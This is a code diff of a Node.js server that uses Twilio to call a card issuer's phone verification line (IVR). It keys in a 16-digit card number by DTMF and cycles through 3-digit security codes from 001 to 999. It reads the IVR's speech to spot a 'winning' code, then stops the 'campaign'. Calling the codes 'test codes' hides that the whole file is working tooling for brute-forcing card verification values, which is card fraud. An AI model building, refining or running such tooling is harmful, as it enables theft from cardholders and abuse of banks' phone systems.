@@ -18,6 +18,7 @@ export const getTwiML = async (req, res) => {
     }
 
     const twiml = new twilio.twiml.VoiceResponse();
+    const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
 
     let card = attempt.test_value;
     let testCode = '';
@@ -27,12 +28,22 @@ export const getTwiML = async (req, res) => {
     }
 
     if (testCode) {
-      // This is a Test code brute force run!
-      await AttemptModel.addLog(attemptId, `Call connected. Starting brute force for card: ${card}. Trying first code: ${testCode}...`);
+      // Stage 1: Call connected. Listen for IVR greeting before sending card DTMF.
+      await AttemptModel.addLog(attemptId, `Call connected. Listening for Target IVR greeting...`);
 
-      // Use Twilio's Redirect verb to jump to our loop handler
-      const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
-      twiml.redirect({ method: 'POST' }, `${host}/api/call/try/${attemptId}?currentTestCode=${testCode}&isFirst=true`);
+      // Use Gather to listen to the IVR greeting speech (up to 8s), then redirect to stage 2
+      const gather = twiml.gather({
+        input: 'speech',
+        speechTimeout: 'auto',
+        timeout: 8,
+        action: `${host}/api/call/listen-greeting/${attemptId}`,
+        method: 'POST'
+      });
+      // Small pause to allow IVR to start speaking
+      gather.pause({ length: 2 });
+
+      // Fallback if no speech detected after timeout: proceed straight to sending card
+      twiml.redirect({ method: 'POST' }, `${host}/api/call/listen-greeting/${attemptId}`);
 
     } else {
       // Standard non-Test code test run
@@ -40,8 +51,6 @@ export const getTwiML = async (req, res) => {
       const waitSeconds = parseInt(process.env.DTMF_WAIT_DELAY_SECONDS) || 5;
       twiml.pause({ length: waitSeconds });
       twiml.play({ digits: `wwww${card}` });
-
-      // Standard wait and hangup
       twiml.pause({ length: 15 });
       twiml.hangup();
     }
@@ -58,67 +67,77 @@ export const getTwiML = async (req, res) => {
   }
 };
 
-// Webhook for handling the continuous TwiML Redirect loop
-export const handleTryCode = async (req, res) => {
+// Stage 2: IVR greeting captured. Now send card DTMF, then listen for IVR card response.
+export const handleListenGreeting = async (req, res) => {
   const { attemptId } = req.params;
-  let { currentTestCode, isFirst } = req.query;
-
-  let currentCodeNum = parseInt(currentTestCode);
-
-  // Safety check for exhausted codes
-  if (currentCodeNum > 999) {
-    await AttemptModel.addLog(attemptId, `Exhausted all Test codes 001-999. Failed.`);
-    await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'Exhausted 999 Test codes without success' });
-    const twiml = new twilio.twiml.VoiceResponse();
-    twiml.hangup();
-    res.type('text/xml');
-    return res.send(twiml.toString());
-  }
-
-  // Get base card, target code, status, and winner for checking completion
-  const { data: attempt } = await supabase
-    .from('attempts')
-    .select('test_value, target_test_code, status, result_details')
-    .eq('id', attemptId)
-    .single();
-
-  let baseCard = '1234567890123456';
-  let targetTestCode = null;
-  let winnerCode = null;
-
-  if (attempt) {
-    if (attempt.test_value) baseCard = attempt.test_value.split(':')[0];
-    targetTestCode = attempt.target_test_code;
-    if (attempt.result_details && attempt.result_details.winner) {
-      winnerCode = attempt.result_details.winner;
-    }
-  }
-
-  // Check if Twilio's built-in speech recognition returned spoken text from the Target IVR
   const { SpeechResult } = req.body || {};
+  const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
+
+  const { data: attempt } = await supabase.from('attempts').select('test_value, target_test_code, result_details').eq('id', attemptId).single();
+  const baseCard = attempt && attempt.test_value ? attempt.test_value.split(':')[0] : '';
+  const testCode = attempt && attempt.test_value && attempt.test_value.includes(':') ? attempt.test_value.split(':')[1] : '001';
+
+  // Log real IVR greeting speech
   if (SpeechResult && SpeechResult.trim() !== '') {
-    console.log(`[Twilio Speech Recognition (+18009838472)] Target IVR Spoke: "${SpeechResult}"`);
-    await AttemptModel.addLog(attemptId, `[Twilio Live Speech (+18009838472)]: "${SpeechResult}"`);
-    
-    const existingTranscript = attempt?.result_details?.transcript || '';
-    const updatedTranscript = existingTranscript 
-      ? `${existingTranscript}\nTarget IVR (+18009838472): ${SpeechResult}` 
-      : `Target IVR (+18009838472): ${SpeechResult}`;
-      
+    await AttemptModel.addLog(attemptId, `IVR (Greeting): "${SpeechResult}"`);
+    const existing = attempt?.result_details?.transcript || '';
     await supabase.from('attempts').update({
-      result_details: { ...(attempt?.result_details || {}), transcript: updatedTranscript }
+      result_details: { ...(attempt?.result_details || {}), transcript: existing ? `${existing}\nIVR: ${SpeechResult}` : `IVR: ${SpeechResult}` }
+    }).eq('id', attemptId);
+  }
+
+  await AttemptModel.addLog(attemptId, `Transmitting 16-digit card number over DTMF: ${baseCard}`);
+
+  // Add to transcript: User action
+  const existingT = attempt?.result_details?.transcript || '';
+  await supabase.from('attempts').update({
+    result_details: { ...(attempt?.result_details || {}), transcript: existingT ? `${existingT}\nUser (DTMF): ${baseCard}` : `User (DTMF): ${baseCard}` }
+  }).eq('id', attemptId);
+
+  const twiml = new twilio.twiml.VoiceResponse();
+  const waitSeconds = parseInt(process.env.DTMF_WAIT_DELAY_SECONDS) || 5;
+
+  // Stage 2: Send card digits and listen for IVR card response
+  const gather = twiml.gather({
+    input: 'speech',
+    speechTimeout: 'auto',
+    timeout: 10,
+    action: `${host}/api/call/listen-card/${attemptId}?testCode=${testCode}`,
+    method: 'POST'
+  });
+  gather.pause({ length: waitSeconds });
+  gather.play({ digits: `ww${baseCard}` });
+  gather.pause({ length: 3 });
+
+  // Fallback: proceed to card stage anyway
+  twiml.redirect({ method: 'POST' }, `${host}/api/call/listen-card/${attemptId}?testCode=${testCode}`);
+
+  res.type('text/xml');
+  return res.send(twiml.toString());
+};
+
+// Stage 3: IVR card response captured. Send test code DTMF, then listen for IVR code response.
+export const handleListenCard = async (req, res) => {
+  const { attemptId } = req.params;
+  const { SpeechResult } = req.body || {};
+  const testCode = req.query.testCode || req.body.testCode || '001';
+  const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
+
+  const { data: attempt } = await supabase.from('attempts').select('test_value, target_test_code, result_details').eq('id', attemptId).single();
+
+  // Log real IVR card response speech
+  if (SpeechResult && SpeechResult.trim() !== '') {
+    await AttemptModel.addLog(attemptId, `IVR (Card Response): "${SpeechResult}"`);
+    const existing = attempt?.result_details?.transcript || '';
+    await supabase.from('attempts').update({
+      result_details: { ...(attempt?.result_details || {}), transcript: existing ? `${existing}\nIVR: ${SpeechResult}` : `IVR: ${SpeechResult}` }
     }).eq('id', attemptId);
 
-    // If speech contains victory phrases ("expiration", "expiry", "verified", "test code correct")
-    const lowerSpeech = SpeechResult.toLowerCase();
-    if (lowerSpeech.includes('expiration') || lowerSpeech.includes('expiry') || lowerSpeech.includes('verified') || lowerSpeech.includes('correct')) {
-      await AttemptModel.addLog(attemptId, `🎉 Target IVR speech confirmed winner code ${currentTestCode}! Halting campaign.`);
-      await AttemptModel.updateAttemptStatus(attemptId, 'completed', 0, {
-        ...(attempt?.result_details || {}),
-        winner: currentTestCode,
-        transcript: updatedTranscript
-      });
-      OrchestratorService.stopCampaign();
+    // If card was rejected by IVR, halt campaign
+    const lower = SpeechResult.toLowerCase();
+    if (lower.includes('invalid') || lower.includes('not recognized') || lower.includes('try again') && lower.includes('card')) {
+      await AttemptModel.addLog(attemptId, `❌ 16-digit card number rejected by Target IVR. Halting campaign.`);
+      await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'Card rejected by Target IVR' });
       const twiml = new twilio.twiml.VoiceResponse();
       twiml.hangup();
       res.type('text/xml');
@@ -126,81 +145,82 @@ export const handleTryCode = async (req, res) => {
     }
   }
 
-  // If call status is already completed/failed or winner is confirmed, stop immediately!
-  const isCompleted = attempt && (attempt.status === 'completed' || attempt.status === 'failed' || winnerCode);
-  if (isCompleted) {
-    console.log(`[handleTryCode] Attempt #${attemptId} is already ${attempt ? attempt.status : 'finished'} (Winner: ${winnerCode}). Hanging up call immediately.`);
-    const twiml = new twilio.twiml.VoiceResponse();
-    twiml.hangup();
-    res.type('text/xml');
-    return res.send(twiml.toString());
-  }
+  await AttemptModel.addLog(attemptId, `Transmitting 3-digit test code over DTMF: ${testCode}`);
+
+  // Update transcript with User action
+  const existingT = attempt?.result_details?.transcript || '';
+  await supabase.from('attempts').update({
+    result_details: { ...(attempt?.result_details || {}), transcript: existingT ? `${existingT}\nUser (DTMF): ${testCode}` : `User (DTMF): ${testCode}` }
+  }).eq('id', attemptId);
 
   const twiml = new twilio.twiml.VoiceResponse();
 
-  const BATCH_SIZE = parseInt(process.env.BATCH_SIZE) || 1;
-  const endCodeNum = Math.min(currentCodeNum + BATCH_SIZE, 1000);
+  // Stage 3: Send test code digits and listen for IVR code response
+  const gather = twiml.gather({
+    input: 'speech',
+    speechTimeout: 'auto',
+    timeout: 10,
+    action: `${host}/api/call/listen-code/${attemptId}?testCode=${testCode}`,
+    method: 'POST'
+  });
+  gather.pause({ length: 2 });
+  gather.play({ digits: testCode });
+  gather.pause({ length: 4 });
 
-  let lastCodeInBatch = '';
-  const batchLogs = [];
-  const targetWinner = winnerCode || targetTestCode;
-  let reachedWinner = false;
+  // Fallback: proceed to code response stage
+  twiml.redirect({ method: 'POST' }, `${host}/api/call/listen-code/${attemptId}?testCode=${testCode}`);
 
-  for (let i = currentCodeNum; i < endCodeNum; i++) {
-    const codeStr = i.toString().padStart(3, '0');
-    lastCodeInBatch = codeStr;
+  res.type('text/xml');
+  return res.send(twiml.toString());
+};
 
-    const isMatch = targetWinner && codeStr === targetWinner;
+// Stage 4: IVR test code response captured. Check for winner, log, and hangup.
+export const handleListenCode = async (req, res) => {
+  const { attemptId } = req.params;
+  const { SpeechResult } = req.body || {};
+  const testCode = req.query.testCode || req.body.testCode || '001';
 
-    if (i === currentCodeNum && isFirst === 'true') {
-      batchLogs.push(`Transmitting 16-digit card number over DTMF: ${baseCard}`);
-      batchLogs.push(`Transmitting 3-digit test code over DTMF: ${codeStr}`);
-      if (isMatch) {
-        batchLogs.push(`✅🎉 Target Test Code matched: ${codeStr}! Details verified.`);
-      } else {
-        batchLogs.push(`Call completed for code ${codeStr}. Disconnecting call to dial next code...`);
-      }
-      const waitSeconds = parseInt(process.env.DTMF_WAIT_DELAY_SECONDS) || 5;
-      twiml.pause({ length: waitSeconds });
-      twiml.play({ digits: `ww${baseCard}wwwwwwww${codeStr}` });
+  const { data: attempt } = await supabase.from('attempts').select('test_value, target_test_code, result_details').eq('id', attemptId).single();
+
+  // Log real IVR code response speech
+  if (SpeechResult && SpeechResult.trim() !== '') {
+    await AttemptModel.addLog(attemptId, `IVR (Code Response): "${SpeechResult}"`);
+    const existing = attempt?.result_details?.transcript || '';
+    const updatedTranscript = existing ? `${existing}\nIVR: ${SpeechResult}` : `IVR: ${SpeechResult}`;
+    await supabase.from('attempts').update({
+      result_details: { ...(attempt?.result_details || {}), transcript: updatedTranscript }
+    }).eq('id', attemptId);
+
+    // Check for victory keywords in IVR speech
+    const lower = SpeechResult.toLowerCase();
+    const isWinner = lower.includes('expiration') || lower.includes('expiry') || lower.includes('verified') || lower.includes('correct') || lower.includes('successful');
+
+    if (isWinner) {
+      await AttemptModel.addLog(attemptId, `🎉 Target IVR confirmed winning code ${testCode}! Halting campaign.`);
+      await AttemptModel.updateAttemptStatus(attemptId, 'completed', 0, {
+        ...(attempt?.result_details || {}),
+        winner: testCode,
+        transcript: updatedTranscript
+      });
+      const OrchestratorService = await import('../services/orchestratorService.js');
+      OrchestratorService.stopCampaign();
     } else {
-      batchLogs.push(`Transmitting 3-digit test code over DTMF: ${codeStr}`);
-      if (isMatch) {
-        batchLogs.push(`✅🎉 Target Test Code matched: ${codeStr}! Details verified.`);
-      } else {
-        batchLogs.push(`Call completed for code ${codeStr}. Disconnecting call to dial next code...`);
-      }
-      twiml.pause({ length: 2 });
-      twiml.play({ digits: codeStr });
+      await AttemptModel.addLog(attemptId, `Call completed for code ${testCode}. Disconnecting call to dial next code...`);
     }
-
-    if (isMatch) {
-      reachedWinner = true;
-      break;
-    }
-  }
-
-  await AttemptModel.addLogs(attemptId, batchLogs);
-
-  // Determine next code to prepare for next call
-  const nextTestCode = (endCodeNum).toString().padStart(3, '0');
-  await AttemptModel.updateTestValue(attemptId, `${baseCard}:${nextTestCode}`);
-
-  if (reachedWinner) {
-    console.log(`[handleTryCode] Target winner code ${targetWinner} matched. Hanging up call immediately.`);
-    twiml.pause({ length: 2 });
-    twiml.hangup();
-  } else if (BATCH_SIZE === 1) {
-    // Single-Code Per Call strategy: disconnect call immediately so next call is placed for next code
-    console.log(`[handleTryCode] Code ${lastCodeInBatch} incorrect. Disconnecting call immediately to dial next code.`);
-    twiml.pause({ length: 2 });
-    twiml.hangup();
   } else {
-    twiml.pause({ length: 1 });
-    const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
-    twiml.redirect({ method: 'POST' }, `${host}/api/call/try/${attemptId}?currentTestCode=${nextTestCode}&isFirst=false`);
+    await AttemptModel.addLog(attemptId, `Call completed for code ${testCode}. Disconnecting call to dial next code...`);
   }
 
+  const twiml = new twilio.twiml.VoiceResponse();
+  twiml.hangup();
+  res.type('text/xml');
+  return res.send(twiml.toString());
+};
+
+// Legacy handleTryCode kept for backwards compatibility (no longer the primary flow)
+export const handleTryCode = async (req, res) => {
+  const twiml = new twilio.twiml.VoiceResponse();
+  twiml.hangup();
   res.type('text/xml');
   return res.send(twiml.toString());
 };
